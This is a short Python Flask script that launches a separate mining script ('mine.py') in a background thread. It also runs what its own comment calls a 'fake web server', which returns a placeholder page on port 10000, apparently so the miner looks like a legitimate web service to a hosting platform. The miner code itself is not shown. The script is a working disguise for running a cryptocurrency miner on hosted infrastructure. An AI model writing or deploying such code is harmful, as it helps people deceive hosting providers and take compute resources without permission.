from flask import Flask
import threading
import subprocess

app = Flask(__name__)

def run_miner():
    subprocess.call(["python", "mine.py"])

@app.route("/")
def home():
    return " running!"

if __name__ == "__main__":
    # Start miner in background
    threading.Thread(target=run_miner, daemon=True).start()
    # Start fake web server
    app.run(host="0.0.0.0", port=10000)
